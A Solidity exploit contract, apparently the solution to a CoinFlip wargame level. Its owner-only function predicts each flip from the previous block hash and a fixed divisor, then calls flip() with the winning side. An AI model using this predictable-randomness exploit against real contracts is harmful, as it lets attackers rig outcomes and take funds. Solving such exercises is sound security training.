// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.19;

import "../../src/CoinFlip/CoinFlip.sol";
import "openzeppelin-contracts/contracts/access/Ownable.sol";
import "openzeppelin-contracts/contracts/utils/math/SafeMath.sol";

contract ThisIsFun is Ownable {
    using SafeMath for uint256;

    CoinFlip public coinFlip;

    constructor(address _coins) {
        coinFlip = CoinFlip(_coins);
    }

    function yoink() public onlyOwner {
        // get block number
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        // call coinflip and store the FACTOR uint256
        uint256 factorz = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        // calculate the coinflip
        uint256 numss = blockValue.div(factorz);
        // calculate the side
        bool side = numss == 1 ? true : false;
        // call flip with the side
        coinFlip.flip(side);
    }
}
